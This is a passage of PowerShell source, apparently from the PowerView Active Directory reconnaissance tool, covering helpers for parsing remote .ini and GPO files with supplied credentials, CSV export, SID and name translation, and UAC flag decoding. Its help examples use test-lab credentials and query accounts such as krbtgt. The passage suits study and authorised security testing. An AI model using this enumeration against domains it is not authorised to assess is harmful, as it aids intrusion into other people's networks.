        if(!$CreateVariables -and !$Dictionary) {
            $DPDictionary
        }
    }
}


function Get-IniContent {
<#
.SYNOPSIS

This helper parses an .ini file into a hashtable.

Author: 'The Scripting Guys'
Modifications: @harmj0y (-Credential support)
License: BSD 3-Clause
Required Dependencies: Add-RemoteConnection, Remove-RemoteConnection

.DESCRIPTION

Parses an .ini file into a hashtable. If -Credential is supplied,
then Add-RemoteConnection is used to map \\COMPUTERNAME\IPC$, the file
is parsed, and then the connection is destroyed with Remove-RemoteConnection.

.PARAMETER Path

Specifies the path to the .ini file to parse.

.PARAMETER OutputObject

Switch. Output a custom PSObject instead of a hashtable.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the remote system.

.EXAMPLE

Get-IniContent C:\Windows\example.ini

.EXAMPLE

"C:\Windows\example.ini" | Get-IniContent -OutputObject

Outputs the .ini details as a proper nested PSObject.

.EXAMPLE

"C:\Windows\example.ini" | Get-IniContent

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
Get-IniContent -Path \\PRIMARY.testlab.local\C$\Temp\GptTmpl.inf -Credential $Cred

.INPUTS

String

Accepts one or more .ini paths on the pipeline.

.OUTPUTS

Hashtable

Ouputs a hashtable representing the parsed .ini file.

.LINK

https://blogs.technet.microsoft.com/heyscriptingguy/2011/08/20/use-powershell-to-work-with-any-ini-file/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([Hashtable])]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('FullName', 'Name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Path,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $OutputObject
    )

    BEGIN {
        $MappedComputers = @{}
    }

    PROCESS {
        ForEach ($TargetPath in $Path) {
            if (($TargetPath -Match '\\\\.*\\.*') -and ($PSBoundParameters['Credential'])) {
                $HostComputer = (New-Object System.Uri($TargetPath)).Host
                if (-not $MappedComputers[$HostComputer]) {
                    # map IPC$ to this computer if it's not already
                    Add-RemoteConnection -ComputerName $HostComputer -Credential $Credential
                    $MappedComputers[$HostComputer] = $True
                }
            }

            if (Test-Path -Path $TargetPath) {
                if ($PSBoundParameters['OutputObject']) {
                    $IniObject = New-Object PSObject
                }
                else {
                    $IniObject = @{}
                }
                Switch -Regex -File $TargetPath {
                    "^\[(.+)\]" # Section
                    {
                        $Section = $matches[1].Trim()
                        if ($PSBoundParameters['OutputObject']) {
                            $Section = $Section.Replace(' ', '')
                            $SectionObject = New-Object PSObject
                            $IniObject | Add-Member Noteproperty $Section $SectionObject
                        }
                        else {
                            $IniObject[$Section] = @{}
                        }
                        $CommentCount = 0
                    }
                    "^(;.*)$" # Comment
                    {
                        $Value = $matches[1].Trim()
                        $CommentCount = $CommentCount + 1
                        $Name = 'Comment' + $CommentCount
                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $IniObject.$Section | Add-Member Noteproperty $Name $Value
                        }
                        else {
                            $IniObject[$Section][$Name] = $Value
                        }
                    }
                    "(.+?)\s*=(.*)" # Key
                    {
                        $Name, $Value = $matches[1..2]
                        $Name = $Name.Trim()
                        $Values = $Value.split(',') | ForEach-Object { $_.Trim() }

                        # if ($Values -isnot [System.Array]) { $Values = @($Values) }

                        if ($PSBoundParameters['OutputObject']) {
                            $Name = $Name.Replace(' ', '')
                            $IniObject.$Section | Add-Member Noteproperty $Name $Values
                        }
                        else {
                            $IniObject[$Section][$Name] = $Values
                        }
                    }
                }
                $IniObject
            }
        }
    }

    END {
        # remove the IPC$ mappings
        $MappedComputers.Keys | Remove-RemoteConnection
    }
}


function Export-PowerViewCSV {
<#
.SYNOPSIS

Converts objects into a series of comma-separated (CSV) strings and saves the
strings in a CSV file in a thread-safe manner.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This helper exports an -InputObject to a .csv in a thread-safe manner
using a mutex. This is so the various multi-threaded functions in
PowerView has a thread-safe way to export output to the same file.
Uses .NET IO.FileStream/IO.StreamWriter objects for speed.

Originally based on Dmitry Sotnikov's Export-CSV code: http://poshcode.org/1590

.PARAMETER InputObject

Specifies the objects to export as CSV strings.

.PARAMETER Path

Specifies the path to the CSV output file.

.PARAMETER Delimiter

Specifies a delimiter to separate the property values. The default is a comma (,)

.PARAMETER Append

Indicates that this cmdlet adds the CSV output to the end of the specified file.
Without this parameter, Export-PowerViewCSV replaces the file contents without warning.

.EXAMPLE

Get-DomainUser | Export-PowerViewCSV -Path "users.csv"

.EXAMPLE

Get-DomainUser | Export-PowerViewCSV -Path "users.csv" -Append -Delimiter '|'

.INPUTS

PSObject

Accepts one or more PSObjects on the pipeline.

.LINK

http://poshcode.org/1590
http://dmitrysotnikov.wordpress.com/2010/01/19/Export-Csv-append/
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [System.Management.Automation.PSObject[]]
        $InputObject,

        [Parameter(Mandatory = $True, Position = 1)]
        [ValidateNotNullOrEmpty()]
        [String]
        $Path,

        [Parameter(Position = 2)]
        [ValidateNotNullOrEmpty()]
        [Char]
        $Delimiter = ',',

        [Switch]
        $Append
    )

    BEGIN {
        $OutputPath = [IO.Path]::GetFullPath($PSBoundParameters['Path'])
        $Exists = [System.IO.File]::Exists($OutputPath)

        # mutex so threaded code doesn't stomp on the output file
        $Mutex = New-Object System.Threading.Mutex $False,'CSVMutex'
        $Null = $Mutex.WaitOne()

        if ($PSBoundParameters['Append']) {
            $FileMode = [System.IO.FileMode]::Append
        }
        else {
            $FileMode = [System.IO.FileMode]::Create
            $Exists = $False
        }

        $CSVStream = New-Object IO.FileStream($OutputPath, $FileMode, [System.IO.FileAccess]::Write, [IO.FileShare]::Read)
        $CSVWriter = New-Object System.IO.StreamWriter($CSVStream)
        $CSVWriter.AutoFlush = $True
    }

    PROCESS {
        ForEach ($Entry in $InputObject) {
            $ObjectCSV = ConvertTo-Csv -InputObject $Entry -Delimiter $Delimiter -NoTypeInformation

            if (-not $Exists) {
                # output the object field names as well
                $ObjectCSV | ForEach-Object { $CSVWriter.WriteLine($_) }
                $Exists = $True
            }
            else {
                # only output object field data
                $ObjectCSV[1..($ObjectCSV.Length-1)] | ForEach-Object { $CSVWriter.WriteLine($_) }
            }
        }
    }

    END {
        $Mutex.ReleaseMutex()
        $CSVWriter.Dispose()
        $CSVStream.Dispose()
    }
}


function Resolve-IPAddress {
<#
.SYNOPSIS

Resolves a given hostename to its associated IPv4 address.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

Resolves a given hostename to its associated IPv4 address using
[Net.Dns]::GetHostEntry(). If no hostname is provided, the default
is the IP address of the localhost.

.EXAMPLE

Resolve-IPAddress -ComputerName SERVER

.EXAMPLE

@("SERVER1", "SERVER2") | Resolve-IPAddress

.INPUTS

String

Accepts one or more IP address strings on the pipeline.

.OUTPUTS

System.Management.Automation.PSCustomObject

A custom PSObject with the ComputerName and IPAddress.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('System.Management.Automation.PSCustomObject')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = $Env:COMPUTERNAME
    )

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                @(([Net.Dns]::GetHostEntry($Computer)).AddressList) | ForEach-Object {
                    if ($_.AddressFamily -eq 'InterNetwork') {
                        $Out = New-Object PSObject
                        $Out | Add-Member Noteproperty 'ComputerName' $Computer
                        $Out | Add-Member Noteproperty 'IPAddress' $_.IPAddressToString
                        $Out
                    }
                }
            }
            catch {
                Write-Verbose "[Resolve-IPAddress] Could not resolve $Computer to an IP Address."
            }
        }
    }
}


function ConvertTo-SID {
<#
.SYNOPSIS

Converts a given user/group name to a security identifier (SID).

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Convert-ADName, Get-DomainObject, Get-Domain  

.DESCRIPTION

Converts a "DOMAIN\username" syntax to a security identifier (SID)
using System.Security.Principal.NTAccount's translate function. If alternate
credentials are supplied, then Get-ADObject is used to try to map the name
to a security identifier.

.PARAMETER ObjectName

The user/group name to convert, can be 'user' or 'DOMAIN\user' format.

.PARAMETER Domain

Specifies the domain to use for the translation, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the translation.

.PARAMETER Credential

Specifies an alternate credential to use for the translation.

.EXAMPLE

ConvertTo-SID 'DEV\dfm'

.EXAMPLE

'DEV\dfm','DEV\krbtgt' | ConvertTo-SID

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
'TESTLAB\dfm' | ConvertTo-SID -Credential $Cred

.INPUTS

String

Accepts one or more username specification strings on the pipeline.

.OUTPUTS

String

A string representing the SID of the translated name.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'Identity')]
        [String[]]
        $ObjectName,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $DomainSearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $DomainSearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $DomainSearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $DomainSearcherArguments['Credential'] = $Credential }
    }

    PROCESS {
        ForEach ($Object in $ObjectName) {
            $Object = $Object -Replace '/','\'

            if ($PSBoundParameters['Credential']) {
                $DN = Convert-ADName -Identity $Object -OutputType 'DN' @DomainSearcherArguments
                if ($DN) {
                    $UserDomain = $DN.SubString($DN.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                    $UserName = $DN.Split(',')[0].split('=')[1]

                    $DomainSearcherArguments['Identity'] = $UserName
                    $DomainSearcherArguments['Domain'] = $UserDomain
                    $DomainSearcherArguments['Properties'] = 'objectsid'
                    Get-DomainObject @DomainSearcherArguments | Select-Object -Expand objectsid
                }
            }
            else {
                try {
                    if ($Object.Contains('\')) {
                        $Domain = $Object.Split('\')[0]
                        $Object = $Object.Split('\')[1]
                    }
                    elseif (-not $PSBoundParameters['Domain']) {
                        $DomainSearcherArguments = @{}
                        $Domain = (Get-Domain @DomainSearcherArguments).Name
                    }

                    $Obj = (New-Object System.Security.Principal.NTAccount($Domain, $Object))
                    $Obj.Translate([System.Security.Principal.SecurityIdentifier]).Value
                }
                catch {
                    Write-Verbose "[ConvertTo-SID] Error converting $Domain\$Object : $_"
                }
            }
        }
    }
}


function ConvertFrom-SID {
<#
.SYNOPSIS

Converts a security identifier (SID) to a group/user name.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Convert-ADName  

.DESCRIPTION

Converts a security identifier string (SID) to a group/user name
using Convert-ADName.

.PARAMETER ObjectSid

Specifies one or more SIDs to convert.

.PARAMETER Domain

Specifies the domain to use for the translation, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the translation.

.PARAMETER Credential

Specifies an alternate credential to use for the translation.

.EXAMPLE

ConvertFrom-SID S-1-5-21-890171859-3433809279-3366196753-1108

TESTLAB\harmj0y

.EXAMPLE

"S-1-5-21-890171859-3433809279-3366196753-1107", "S-1-5-21-890171859-3433809279-3366196753-1108", "S-1-5-32-562" | ConvertFrom-SID

TESTLAB\WINDOWS2$
TESTLAB\harmj0y
BUILTIN\Distributed COM Users

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm', $SecPassword)
ConvertFrom-SID S-1-5-21-890171859-3433809279-3366196753-1108 -Credential $Cred

TESTLAB\harmj0y

.INPUTS

String

Accepts one or more SID strings on the pipeline.

.OUTPUTS

String

The converted DOMAIN\username.
#>

    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('SID')]
        [ValidatePattern('^S-1-.*')]
        [String[]]
        $ObjectSid,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ADNameArguments = @{}
        if ($PSBoundParameters['Domain']) { $ADNameArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Server']) { $ADNameArguments['Server'] = $Server }
        if ($PSBoundParameters['Credential']) { $ADNameArguments['Credential'] = $Credential }
    }

    PROCESS {
        ForEach ($TargetSid in $ObjectSid) {
            $TargetSid = $TargetSid.trim('*')
            try {
                # try to resolve any built-in SIDs first - https://support.microsoft.com/en-us/kb/243330
                Switch ($TargetSid) {
                    'S-1-0'         { 'Null Authority' }
                    'S-1-0-0'       { 'Nobody' }
                    'S-1-1'         { 'World Authority' }
                    'S-1-1-0'       { 'Everyone' }
                    'S-1-2'         { 'Local Authority' }
                    'S-1-2-0'       { 'Local' }
                    'S-1-2-1'       { 'Console Logon ' }
                    'S-1-3'         { 'Creator Authority' }
                    'S-1-3-0'       { 'Creator Owner' }
                    'S-1-3-1'       { 'Creator Group' }
                    'S-1-3-2'       { 'Creator Owner Server' }
                    'S-1-3-3'       { 'Creator Group Server' }
                    'S-1-3-4'       { 'Owner Rights' }
                    'S-1-4'         { 'Non-unique Authority' }
                    'S-1-5'         { 'NT Authority' }
                    'S-1-5-1'       { 'Dialup' }
                    'S-1-5-2'       { 'Network' }
                    'S-1-5-3'       { 'Batch' }
                    'S-1-5-4'       { 'Interactive' }
                    'S-1-5-6'       { 'Service' }
                    'S-1-5-7'       { 'Anonymous' }
                    'S-1-5-8'       { 'Proxy' }
                    'S-1-5-9'       { 'Enterprise Domain Controllers' }
                    'S-1-5-10'      { 'Principal Self' }
                    'S-1-5-11'      { 'Authenticated Users' }
                    'S-1-5-12'      { 'Restricted Code' }
                    'S-1-5-13'      { 'Terminal Server Users' }
                    'S-1-5-14'      { 'Remote Interactive Logon' }
                    'S-1-5-15'      { 'This Organization ' }
                    'S-1-5-17'      { 'This Organization ' }
                    'S-1-5-18'      { 'Local System' }
                    'S-1-5-19'      { 'NT Authority' }
                    'S-1-5-20'      { 'NT Authority' }
                    'S-1-5-80-0'    { 'All Services ' }
                    'S-1-5-32-544'  { 'BUILTIN\Administrators' }
                    'S-1-5-32-545'  { 'BUILTIN\Users' }
                    'S-1-5-32-546'  { 'BUILTIN\Guests' }
                    'S-1-5-32-547'  { 'BUILTIN\Power Users' }
                    'S-1-5-32-548'  { 'BUILTIN\Account Operators' }
                    'S-1-5-32-549'  { 'BUILTIN\Server Operators' }
                    'S-1-5-32-550'  { 'BUILTIN\Print Operators' }
                    'S-1-5-32-551'  { 'BUILTIN\Backup Operators' }
                    'S-1-5-32-552'  { 'BUILTIN\Replicators' }
                    'S-1-5-32-554'  { 'BUILTIN\Pre-Windows 2000 Compatible Access' }
                    'S-1-5-32-555'  { 'BUILTIN\Remote Desktop Users' }
                    'S-1-5-32-556'  { 'BUILTIN\Network Configuration Operators' }
                    'S-1-5-32-557'  { 'BUILTIN\Incoming Forest Trust Builders' }
                    'S-1-5-32-558'  { 'BUILTIN\Performance Monitor Users' }
                    'S-1-5-32-559'  { 'BUILTIN\Performance Log Users' }
                    'S-1-5-32-560'  { 'BUILTIN\Windows Authorization Access Group' }
                    'S-1-5-32-561'  { 'BUILTIN\Terminal Server License Servers' }
                    'S-1-5-32-562'  { 'BUILTIN\Distributed COM Users' }
                    'S-1-5-32-569'  { 'BUILTIN\Cryptographic Operators' }
                    'S-1-5-32-573'  { 'BUILTIN\Event Log Readers' }
                    'S-1-5-32-574'  { 'BUILTIN\Certificate Service DCOM Access' }
                    'S-1-5-32-575'  { 'BUILTIN\RDS Remote Access Servers' }
                    'S-1-5-32-576'  { 'BUILTIN\RDS Endpoint Servers' }
                    'S-1-5-32-577'  { 'BUILTIN\RDS Management Servers' }
                    'S-1-5-32-578'  { 'BUILTIN\Hyper-V Administrators' }
                    'S-1-5-32-579'  { 'BUILTIN\Access Control Assistance Operators' }
                    'S-1-5-32-580'  { 'BUILTIN\Access Control Assistance Operators' }
                    Default {
                        Convert-ADName -Identity $TargetSid @ADNameArguments
                    }
                }
            }
            catch {
                Write-Verbose "[ConvertFrom-SID] Error converting SID '$TargetSid' : $_"
            }
        }
    }
}


function Convert-ADName {
<#
.SYNOPSIS

Converts Active Directory object names between a variety of formats.

Author: Bill Stewart, Pasquale Lantella  
Modifications: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This function is heavily based on Bill Stewart's code and Pasquale Lantella's code (in LINK)
and translates Active Directory names between various formats using the NameTranslate COM object.

.PARAMETER Identity

Specifies the Active Directory object name to translate, of the following form:

    DN                short for 'distinguished name'; e.g., 'CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com'
    Canonical         canonical name; e.g., 'fabrikam.com/Engineers/Phineas Flynn'
    NT4               domain\username; e.g., 'fabrikam\pflynn'
    Display           display name, e.g. 'pflynn'
    DomainSimple      simple domain name format, e.g. 'pflynn@fabrikam.com'
    EnterpriseSimple  simple enterprise name format, e.g. 'pflynn@fabrikam.com'
    GUID              GUID; e.g., '{95ee9fff-3436-11d1-b2b0-d15ae3ac8436}'
    UPN               user principal name; e.g., 'pflynn@fabrikam.com'
    CanonicalEx       extended canonical name format
    SPN               service principal name format; e.g. 'HTTP/kairomac.contoso.com'
    SID               Security Identifier; e.g., 'S-1-5-21-12986231-600641547-709122288-57999'

.PARAMETER OutputType

Specifies the output name type you want to convert to, which must be one of the following:

    DN                short for 'distinguished name'; e.g., 'CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com'
    Canonical         canonical name; e.g., 'fabrikam.com/Engineers/Phineas Flynn'
    NT4               domain\username; e.g., 'fabrikam\pflynn'
    Display           display name, e.g. 'pflynn'
    DomainSimple      simple domain name format, e.g. 'pflynn@fabrikam.com'
    EnterpriseSimple  simple enterprise name format, e.g. 'pflynn@fabrikam.com'
    GUID              GUID; e.g., '{95ee9fff-3436-11d1-b2b0-d15ae3ac8436}'
    UPN               user principal name; e.g., 'pflynn@fabrikam.com'
    CanonicalEx       extended canonical name format, e.g. 'fabrikam.com/Users/Phineas Flynn'
    SPN               service principal name format; e.g. 'HTTP/kairomac.contoso.com'

.PARAMETER Domain

Specifies the domain to use for the translation, defaults to the current domain.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to for the translation.

.PARAMETER Credential

Specifies an alternate credential to use for the translation.

.EXAMPLE

Convert-ADName -Identity "TESTLAB\harmj0y"

harmj0y@testlab.local

.EXAMPLE

"TESTLAB\krbtgt", "CN=Administrator,CN=Users,DC=testlab,DC=local" | Convert-ADName -OutputType Canonical

testlab.local/Users/krbtgt
testlab.local/Users/Administrator

.EXAMPLE

Convert-ADName -OutputType dn -Identity 'TESTLAB\harmj0y' -Server PRIMARY.testlab.local

CN=harmj0y,CN=Users,DC=testlab,DC=local

.EXAMPLE

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm', $SecPassword)
'S-1-5-21-890171859-3433809279-3366196753-1108' | Convert-ADNAme -Credential $Cred

TESTLAB\harmj0y

.INPUTS

String

Accepts one or more objects name strings on the pipeline.

.OUTPUTS

String

Outputs a string representing the converted name.

.LINK

http://windowsitpro.com/active-directory/translating-active-directory-object-names-between-formats
https://gallery.technet.microsoft.com/scriptcenter/Translating-Active-5c80dd67
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseShouldProcessForStateChangingFunctions', '')]
    [OutputType([String])]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name', 'ObjectName')]
        [String[]]
        $Identity,

        [String]
        [ValidateSet('DN', 'Canonical', 'NT4', 'Display', 'DomainSimple', 'EnterpriseSimple', 'GUID', 'Unknown', 'UPN', 'CanonicalEx', 'SPN')]
        $OutputType,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $NameTypes = @{
            'DN'                =   1  # CN=Phineas Flynn,OU=Engineers,DC=fabrikam,DC=com
            'Canonical'         =   2  # fabrikam.com/Engineers/Phineas Flynn
            'NT4'               =   3  # fabrikam\pflynn
            'Display'           =   4  # pflynn
            'DomainSimple'      =   5  # pflynn@fabrikam.com
            'EnterpriseSimple'  =   6  # pflynn@fabrikam.com
            'GUID'              =   7  # {95ee9fff-3436-11d1-b2b0-d15ae3ac8436}
            'Unknown'           =   8  # unknown type - let the server do translation
            'UPN'               =   9  # pflynn@fabrikam.com
            'CanonicalEx'       =   10 # fabrikam.com/Users/Phineas Flynn
            'SPN'               =   11 # HTTP/kairomac.contoso.com
            'SID'               =   12 # S-1-5-21-12986231-600641547-709122288-57999
        }

        # accessor functions from Bill Stewart to simplify calls to NameTranslate
        function Invoke-Method([__ComObject] $Object, [String] $Method, $Parameters) {
            $Output = $Null
            $Output = $Object.GetType().InvokeMember($Method, 'InvokeMethod', $NULL, $Object, $Parameters)
            Write-Output $Output
        }

        function Get-Property([__ComObject] $Object, [String] $Property) {
            $Object.GetType().InvokeMember($Property, 'GetProperty', $NULL, $Object, $NULL)
        }

        function Set-Property([__ComObject] $Object, [String] $Property, $Parameters) {
            [Void] $Object.GetType().InvokeMember($Property, 'SetProperty', $NULL, $Object, $Parameters)
        }

        # https://msdn.microsoft.com/en-us/library/aa772266%28v=vs.85%29.aspx
        if ($PSBoundParameters['Server']) {
            $ADSInitType = 2
            $InitName = $Server
        }
        elseif ($PSBoundParameters['Domain']) {
            $ADSInitType = 1
            $InitName = $Domain
        }
        elseif ($PSBoundParameters['Credential']) {
            $Cred = $Credential.GetNetworkCredential()
            $ADSInitType = 1
            $InitName = $Cred.Domain
        }
        else {
            # if no domain or server is specified, default to GC initialization
            $ADSInitType = 3
            $InitName = $Null
        }
    }

    PROCESS {
        ForEach ($TargetIdentity in $Identity) {
            if (-not $PSBoundParameters['OutputType']) {
                if ($TargetIdentity -match "^[A-Za-z]+\\[A-Za-z ]+") {
                    $ADSOutputType = $NameTypes['DomainSimple']
                }
                else {
                    $ADSOutputType = $NameTypes['NT4']
                }
            }
            else {
                $ADSOutputType = $NameTypes[$OutputType]
            }

            $Translate = New-Object -ComObject NameTranslate

            if ($PSBoundParameters['Credential']) {
                try {
                    $Cred = $Credential.GetNetworkCredential()

                    Invoke-Method $Translate 'InitEx' (
                        $ADSInitType,
                        $InitName,
                        $Cred.UserName,
                        $Cred.Domain,
                        $Cred.Password
                    )
                }
                catch {
                    Write-Verbose "[Convert-ADName] Error initializing translation for '$Identity' using alternate credentials : $_"
                }
            }
            else {
                try {
                    $Null = Invoke-Method $Translate 'Init' (
                        $ADSInitType,
                        $InitName
                    )
                }
                catch {
                    Write-Verbose "[Convert-ADName] Error initializing translation for '$Identity' : $_"
                }
            }

            # always chase all referrals
            Set-Property $Translate 'ChaseReferral' (0x60)

            try {
                # 8 = Unknown name type -> let the server do the work for us
                $Null = Invoke-Method $Translate 'Set' (8, $TargetIdentity)
                Invoke-Method $Translate 'Get' ($ADSOutputType)
            }
            catch [System.Management.Automation.MethodInvocationException] {
                Write-Verbose "[Convert-ADName] Error translating '$TargetIdentity' : $($_.Exception.InnerException.Message)"
            }
        }
    }
}


function ConvertFrom-UACValue {
<#
.SYNOPSIS

Converts a UAC int value to human readable form.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.DESCRIPTION

This function will take an integer that represents a User Account
Control (UAC) binary blob and will covert it to an ordered
dictionary with each bitwise value broken out. By default only values
set are displayed- the -ShowAll switch will display all values with
a + next to the ones set.

.PARAMETER Value

Specifies the integer UAC value to convert.

.PARAMETER ShowAll

Switch. Signals ConvertFrom-UACValue to display all UAC values, with a + indicating the value is currently set.

.EXAMPLE

ConvertFrom-UACValue -Value 66176

Name                           Value
----                           -----
ENCRYPTED_TEXT_PWD_ALLOWED     128
NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536

.EXAMPLE

Get-DomainUser harmj0y | ConvertFrom-UACValue

Name                           Value
----                           -----
NORMAL_ACCOUNT                 512
DONT_EXPIRE_PASSWORD           65536

.EXAMPLE

Get-DomainUser harmj0y | ConvertFrom-UACValue -ShowAll

Name                           Value
----                           -----
SCRIPT                         1
ACCOUNTDISABLE                 2
HOMEDIR_REQUIRED               8
LOCKOUT                        16
PASSWD_NOTREQD                 32
PASSWD_CANT_CHANGE             64
ENCRYPTED_TEXT_PWD_ALLOWED     128
TEMP_DUPLICATE_ACCOUNT         256
NORMAL_ACCOUNT                 512+
INTERDOMAIN_TRUST_ACCOUNT      2048
WORKSTATION_TRUST_ACCOUNT      4096
SERVER_TRUST_ACCOUNT           8192
DONT_EXPIRE_PASSWORD           65536+
MNS_LOGON_ACCOUNT              131072
SMARTCARD_REQUIRED             262144
TRUSTED_FOR_DELEGATION         524288
NOT_DELEGATED                  1048576
USE_DES_KEY_ONLY               2097152
DONT_REQ_PREAUTH               4194304
PASSWORD_EXPIRED               8388608
TRUSTED_TO_AUTH_FOR_DELEGATION 16777216
PARTIAL_SECRETS_ACCOUNT        67108864

.INPUTS

Int

Accepts an integer representing a UAC binary blob.

.OUTPUTS

System.Collections.Specialized.OrderedDictionary

An ordered dictionary with the converted UAC fields.

.LINK

https://support.microsoft.com/en-us/kb/305144
#>

    [OutputType('System.Collections.Specialized.OrderedDictionary')]
    [CmdletBinding()]
    Param(
        [Parameter(Mandatory = $True, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('UAC', 'useraccountcontrol')]
        [Int]
        $Value,

        [Switch]
        $ShowAll
    )

    BEGIN {
        # values from https://support.microsoft.com/en-us/kb/305144
        $UACValues = New-Object System.Collections.Specialized.OrderedDictionary
        $UACValues.Add("SCRIPT", 1)
        $UACValues.Add("ACCOUNTDISABLE", 2)
        $UACValues.Add("HOMEDIR_REQUIRED", 8)
        $UACValues.Add("LOCKOUT", 16)
        $UACValues.Add("PASSWD_NOTREQD", 32)
        $UACValues.Add("PASSWD_CANT_CHANGE", 64)
        $UACValues.Add("ENCRYPTED_TEXT_PWD_ALLOWED", 128)
        $UACValues.Add("TEMP_DUPLICATE_ACCOUNT", 256)
        $UACValues.Add("NORMAL_ACCOUNT", 512)
        $UACValues.Add("INTERDOMAIN_TRUST_ACCOUNT", 2048)
        $UACValues.Add("WORKSTATION_TRUST_ACCOUNT", 4096)
        $UACValues.Add("SERVER_TRUST_ACCOUNT", 8192)
        $UACValues.Add("DONT_EXPIRE_PASSWORD", 65536)
        $UACValues.Add("MNS_LOGON_ACCOUNT", 131072)
        $UACValues.Add("SMARTCARD_REQUIRED", 262144)
        $UACValues.Add("TRUSTED_FOR_DELEGATION", 524288)
        $UACValues.Add("NOT_DELEGATED", 1048576)
        $UACValues.Add("USE_DES_KEY_ONLY", 2097152)
        $UACValues.Add("DONT_REQ_PREAUTH", 4194304)
        $UACValues.Add("PASSWORD_EXPIRED", 8388608)
        $UACValues.Add("TRUSTED_TO_AUTH_FOR_DELEGATION", 16777216)
        $UACValues.Add("PARTIAL_SECRETS_ACCOUNT", 67108864)
    }

    PROCESS {
        $ResultUACValues = New-Object System.Collections.Specialized.OrderedDictionary

        if ($ShowAll) {
            ForEach ($UACValue in $UACValues.GetEnumerator()) {
                if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)+")
                }
                else {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)")
                }
            }
        }
        else {
            ForEach ($UACValue in $UACValues.GetEnumerator()) {
                if ( ($Value -band $UACValue.Value) -eq $UACValue.Value) {
                    $ResultUACValues.Add($UACValue.Name, "$($UACValue.Value)")
                }
            }
        }
        $ResultUACValues
    }
}


function Get-PrincipalContext {
<#
.SYNOPSIS

Helper to take an Identity and return a DirectoryServices.AccountManagement.PrincipalContext
and simplified identity.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: None  

.PARAMETER Identity

